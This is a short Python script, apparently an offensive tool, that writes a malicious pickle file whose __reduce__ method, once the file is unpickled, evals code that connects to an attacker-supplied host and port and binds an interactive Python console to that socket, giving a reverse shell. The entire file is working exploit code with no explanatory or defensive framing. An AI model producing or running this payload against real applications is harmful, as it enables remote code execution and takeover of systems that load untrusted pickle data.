import sys
import pickle


class ReverseREPL(object):
    def __reduce__(self):
        return (__builtins__.eval, ('eval(compile("""import socket,os,code,traceback\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\'{0}\', {1}))\nprev0=os.dup(0)\nprev1=os.dup(1)\nprev2=os.dup(2)\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nshell=code.InteractiveConsole(globals().copy().update(locals()))\nprint()\nprint()\nprint(\'!!!WARNING!!! DO NOT EXIT THIS PROMPT WITH exit(), quit(), or ^D. Raise SystemExit instead. InteractiveConsole contains an open bug in which it closes <STDIN> when exit(), quit(), or ^D are used. This will prevent the use of most reverse shells until the application is restarted. In some cases, this may also cause a Denial of Service. BE EXTRA CAREFUL TO EXIT THIS PROMPT BY MANUALLY RAISING SystemExit.\')\nprint()\nprint()\ntry:    shell.interact()\nexcept:\n    traceback.print_exc()\nos.dup2(prev0,0)\nos.close(prev0)\nos.dup2(prev1,1)\nos.close(prev1)\nos.dup2(prev2,2)\nos.close(prev2)""", "<stdin>", "exec"))'.format(sys.argv[1], sys.argv[2]),))


obj = ReverseREPL()
pickle.dump(obj, open("payload.pkl", "wb"))
